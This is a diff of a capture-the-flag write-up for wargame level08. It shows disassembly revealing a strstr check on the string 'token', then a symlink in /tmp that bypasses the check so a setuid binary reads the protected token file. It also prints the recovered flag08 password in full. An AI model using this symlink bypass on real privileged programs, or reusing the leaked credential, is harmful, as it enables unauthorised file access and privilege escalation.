@@ -1,16 +1,29 @@
 Once again, there is a binary executed with the rights we want.
 There is also a file named token, on which we have, of course, no rights.
-A quick look at the level08 binary objdump teaches us that it needs an argument,
+
+(in <main>)
+
+80485af:	c7 44 24 04 93 87 04 	mov    DWORD PTR [esp+0x4],0x8048793
+80485b6:	08
+80485b7:	89 04 24             	mov    DWORD PTR [esp],eax
+80485ba:	e8 41 fe ff ff       	call   8048400 <strstr@plt>
+
+$>gdb
+(gdb)$> x/s 0x8048793
+
+0x8048793:	 "token"
+
+A quick look at the level08 binary objdump teaches us that it needs an argument, 
 which it will open and read. Of course, there is a catch, your argument, thus the
 file you want to read, must not contain the substring "token" (strstr is called).
 
 Once again, we can use tmp.
 
--> cd /tmp
--> ln -s /home/user/level08/token ./exploit
--> /home/user/level08/level08 exploit
--> su flag08
--> quif5eloekouj29ke0vouxean
--> getflag
+$> cd /tmp
+$> ln -s /home/user/level08/token ./exploit
+$> /home/user/level08/level08 exploit
+$> su flag08
+$> quif5eloekouj29ke0vouxean
+$> getflag
 
 We can now get the next flag.
